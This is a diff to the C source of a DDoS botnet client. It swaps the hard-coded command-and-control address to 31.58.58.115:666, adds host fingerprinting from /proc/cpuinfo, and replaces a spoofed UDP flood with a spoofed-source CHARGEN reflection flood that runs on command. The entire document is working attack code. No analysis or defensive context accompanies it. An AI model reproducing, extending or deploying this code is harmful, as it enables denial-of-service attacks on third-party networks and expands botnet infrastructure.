@@ -1,7 +1,31 @@
+#define PR_SET_NAME 15
+#define PAD_RIGHT 1
+#define PAD_ZERO 2
+#define PRINT_BUF_LEN 12
+#define CMD_IAC   255
+#define CMD_WILL  251
+#define CMD_WONT  252
+#define CMD_DO    253
+#define CMD_DONT  254
+#define OPT_SGA   3
+#define PROTO_GRE 47
+#define GRE_PROTO_IP 0x0800
+#define PROTO_UDPLITE 136
+
+#define STD_PIGZ 50
+#define PHI 0x9e3779b9 
+#define UDP_HDRLEN 8
+#define IP_MAXPACKET 65535
+#define UID_PATH "/etc/.uid"
+#define XOR_KEY "demonkey"
+#define IP4_HDRLEN 20
+#define ICMP_HDRLEN 8
 #include <stdlib.h>
 #include <stdarg.h>
 #include <stdio.h>
-#include <sys/socket.h>
+#include <sys/socket.h>   // for struct iphdr
+#include <arpa/inet.h>     // for inet_addr, htons
+
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -14,26 +38,13 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <netinet/ip.h>
-#include <netinet/udp.h>
+
 #include <netinet/tcp.h>
 #include <sys/wait.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
-#include <time.h>
-#include <dirent.h>
-#include <ctype.h>
-#include <sys/prctl.h>
-#define PAD_RIGHT 1
-#define PAD_ZERO 2
-#define PRINT_BUF_LEN 12
-#define PR_SET_NAME 15
-#define PHI 0x9e3779b9
-#define CMD_IAC 255
-#define CMD_WILL 251
-#define CMD_WONT 252
-#define CMD_DO 253
-#define CMD_DONT 254
-#define OPT_SGA 3
+#include <pthread.h>
+
 #define std_packets 1460
 #define BUFFER_SIZE 1024
 #define SERVER_LIST_SIZE (sizeof(ServerInfo) / sizeof(unsigned char *))
@@ -85,9 +96,9 @@ if(access("/usr/bin/python", F_OK) != -1){
 
 
 
-#define Server_Botport 282
-unsigned char *ServerInfo[] = {"80.211.34.102:52468"};
-
+#define Server_Botport 666
+unsigned char *ServerInfo[] = {"31.58.58.115:666"};
+int getBogos(unsigned char *bogomips);
 int botnetServer = -1;
 uint32_t *pids;
 uint32_t botnetPid;
@@ -153,6 +164,12 @@ void rand_str(char *str, int len) {
 		}
 	}
 }
+
+void uppercase(unsigned char *str)
+{
+        while(*str) { *str = toupper(*str); str++; }
+}
+
 void rand_alphastr(uint8_t *str, int len) {
 	const char alphaset[] = "zxry3gdqbbr6lzncrmpvqypeuaqzfrv";
 	while (len > 0) {
@@ -490,8 +507,39 @@ unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
 	free(tcp);
 	return output;
 }
+#ifndef __UDPHDR_DEFINED
+#define __UDPHDR_DEFINED
 
+struct udphdr {
+    uint16_t source;
+    uint16_t dest;
+    uint16_t len;
+    uint16_t check;
+};
 
+#endif
+int getBogos(unsigned char *bogomips)
+{
+        int cmdline = open("/proc/cpuinfo", O_RDONLY);
+        char linebuf[4096];
+        while(fdgets(linebuf, 4096, cmdline) != NULL)
+        {
+                uppercase(linebuf);
+                if(strstr(linebuf, "BOGOMIPS") == linebuf)
+                {
+                        unsigned char *pos = linebuf + 8;
+                        while(*pos == ' ' || *pos == '\t' || *pos == ':') pos++;
+                        while(pos[strlen(pos)-1] == '\r' || pos[strlen(pos)-1] == '\n') pos[strlen(pos)-1]=0;
+                        if(strchr(pos, '.') != NULL) *strchr(pos, '.') = 0x00;
+                        strcpy(bogomips, pos);
+                        close(cmdline);
+                        return 0;
+                }
+                memset(linebuf, 0, 4096);
+        }
+        close(cmdline);
+        return 1;
+}
 void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
 	iph->ihl = 5;
 	iph->version = 4;
@@ -510,115 +558,72 @@ int sclose(int fd) {
 	close(fd);
 	return 0;
 }
-void UpdateNameSrvs()
-{
-    uint16_t fhandler = open("/etc/resolv.conf", O_WRONLY | O_TRUNC);
-    if (access("/etc/resolv.conf", F_OK) != -1) {
-        const char* resd = "nameserver 8.8.8.8\nnameserver 8.8.4.4\n";
-        size_t resl = strlen(resd);
-        write(fhandler, resd, resl);
-	} else { return; }
-    close(fhandler);
+
+void makeSystemUID(unsigned char *uid, int size) {
+    unsigned char bogomips[16];
+    memset(bogomips, 0, sizeof(bogomips));
+    getBogos(bogomips);  // From /proc/cpuinfo
+    snprintf((char *)uid, size, "%s-%s", inet_ntoa(ourIP), bogomips);
 }
 
-void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
+
+
+void sendCHARGEN(unsigned char *target, int duration, int spoofit, int packetsize) {
 	struct sockaddr_in dest_addr;
 	dest_addr.sin_family = AF_INET;
-	if(port == 0) dest_addr.sin_port = rand_cmwc();
-	else dest_addr.sin_port = htons(port);
-	if(getHost(target, &dest_addr.sin_addr)) return;
-	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
-	register unsigned int pollRegister;
-	pollRegister = pollinterval;
-	if(spoofit == 32) {
-		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-		if(!sockfd) {
-			#ifdef PRINTS
-			botnetPrint(KadenCommStock, "Failed opening raw socket.");
-			#endif
-			return;
-		}
-		unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
-		if(buf == NULL) return;
-		memset(buf, 0, packetsize + 1);
-		makeRandomStr(buf, packetsize);
-		int end = time(NULL) + timeEnd;
-		register unsigned int i = 0;
-		register unsigned int ii = 0;
-		while(1) {
-			sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
-			if(i == pollRegister) {
-				if(port == 0) dest_addr.sin_port = rand_cmwc();
-				if(time(NULL) > end) break;
-				i = 0;
-				continue;
-			}
-			i++;
-			if(ii == sleepcheck) {
-				usleep(sleeptime*1000);
-				ii = 0;
-				continue;
-			}
-			ii++;
-		}
-	} else {
-		int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-		if(!sockfd) {
-			#ifdef PRINTS
-			botnetPrint(KadenCommStock, "Failed opening raw socket.");
-			#endif
-			return;
-		}
-		int tmp = 1;
-		if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)	{
-			#ifdef PRINTS
-			botnetPrint(KadenCommStock, "Failed setting raw headers mode.");
-			#endif
-			return;
-		}
-		int counter = 50;
-		while(counter--) {
-			srand(time(NULL) ^ rand_cmwc());
-			init_rand(rand());
-		}
-		in_addr_t netmask;
-		if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
-		else netmask = ( ~((1 << (32 - spoofit)) - 1) );
-		unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
-		struct iphdr *iph = (struct iphdr *)packet;
-		struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
-		makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( GRIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
-		udph->len = htons(sizeof(struct udphdr) + packetsize);
-		udph->source = rand_cmwc();
-		udph->dest = (port == 0 ? rand_cmwc() : htons(port));
-		udph->check = 0;
-		makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
-		iph->check = csum ((unsigned short *) packet, iph->tot_len);
-		int end = time(NULL) + timeEnd;
-		register unsigned int i = 0;
-		register unsigned int ii = 0;
-		while(1) {
-			sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));	
-			udph->source = rand_cmwc();
-			udph->dest = (port == 0 ? rand_cmwc() : htons(port));
-			iph->id = rand_cmwc();
-			iph->saddr = htonl( GRIP(netmask) );
-			iph->check = csum ((unsigned short *) packet, iph->tot_len);
-			if(i == pollRegister) {
-				if(time(NULL) > end) break;
-				i = 0;
-				continue;
-			}
-			i++;
-			if(ii == sleepcheck) {
-				usleep(sleeptime*1000);
-				ii = 0;
-				continue;
-			}
-			ii++;
-		}
+	dest_addr.sin_port = htons(19); // CHARGEN port
+	if (getHost(target, &dest_addr.sin_addr)) return;
+	memset(dest_addr.sin_zero, 0, sizeof(dest_addr.sin_zero));
+
+	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+	if (sockfd < 0) return;
+
+	int tmp = 1;
+	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
+		close(sockfd);
+		return;
 	}
+
+	in_addr_t netmask = (spoofit == 0) ? ~((in_addr_t)0) : ~((1 << (32 - spoofit)) - 1);
+
+	unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
+	struct iphdr *iph = (struct iphdr *)packet;
+	struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
+	unsigned char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
+
+	int end = time(NULL) + duration;
+	while (time(NULL) < end) {
+		makeRandomStr(data, packetsize);
+
+		uint32_t src_ip = htonl(GRIP(netmask));
+		uint16_t src_port = rand_cmwc() % 65535;
+
+		// IP header
+		iph->ihl = 5;
+		iph->version = 4;
+		iph->tos = 0;
+		iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize);
+		iph->id = htons(rand_cmwc() % 65535);
+		iph->frag_off = 0;
+		iph->ttl = MAXTTL;
+		iph->protocol = IPPROTO_UDP;
+		iph->saddr = src_ip;
+		iph->daddr = dest_addr.sin_addr.s_addr;
+		iph->check = 0;
+		iph->check = csum((unsigned short *)packet, sizeof(struct iphdr));
+
+		// UDP header
+		udph->source = htons(src_port);
+		udph->dest = htons(19); // CHARGEN
+		udph->len = htons(sizeof(struct udphdr) + packetsize);
+		udph->check = 0;
+
+		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+	}
+
+	close(sockfd);
 }
+
 
 void sendSTD(unsigned char *ip, int port, int secs) 
 {
@@ -652,35 +657,32 @@ void sendSTD(unsigned char *ip, int port, int secs)
 }
 void processCmd(int argc, unsigned char *argv[]) { 
 	
-	if(!strcmp(argv[0], "UDP")) {
-		if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
-			return;
-		}
-		unsigned char *ip = argv[1];
-		int port = atoi(argv[2]);
-		int time = atoi(argv[3]);
-		int spoofed = atoi(argv[4]);
-		int packetsize = atoi(argv[5]);
-		int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
-		int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
-		int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
-		if(strstr(ip, ",") != NULL) {
-			unsigned char *hi = strtok(ip, ",");
-			while(hi != NULL) {
-				if(!listFork()) {
-					sendUDP(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
-					_exit(0);
-				}
-				hi = strtok(NULL, ",");
-			}	
-		} else {
-			if (!listFork()){
-				sendUDP(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+	if (!strcmp(argv[0], "CHARGEN")) {
+	if (argc < 5) return;
+
+	unsigned char *ip = argv[1];
+	int duration = atoi(argv[2]);
+	int spoofit = atoi(argv[3]);
+	int packetsize = atoi(argv[4]);
+
+	if (strstr(ip, ",") != NULL) {
+		unsigned char *hi = strtok(ip, ",");
+		while (hi != NULL) {
+			if (!listFork()) {
+				sendCHARGEN(hi, duration, spoofit, packetsize);
 				_exit(0);
 			}
+			hi = strtok(NULL, ",");
 		}
-		return;
+	} else {
+		if (!listFork()) {
+			sendCHARGEN(ip, duration, spoofit, packetsize);
+			_exit(0);
+		}
 	}
+	return;
+}
+
 	
      
 		if(!strcmp(argv[0], "STD"))
@@ -835,8 +837,10 @@ int main(int argc, unsigned char *argv[]) {
 	while(1) {
 		if(initConnection()) { continue; }
 		botnetPrint(KadenCommStock, "\e[0;97m[ \e[0;91mExecution \e[0;97m] [ \e[0;91m%s\e[0;97m ] Connected -> \e[0;91m%s\e[0;97m  | Endian \e[0;91m%s  \e[0;97m| Device: \e[0;91m%s", getBuild(), inet_ntoa(ourIP), getEndianness(), getBuildz());
-		CleanDevice();
-		UpdateNameSrvs();
+		unsigned char uid[64];
+              makeSystemUID(uid, sizeof(uid));
+              botnetPrint(KadenCommStock, "\x1b[33m UID %s", uid);
+
 		char commBuf[4096];
 		int got = 0;
 		int i = 0;
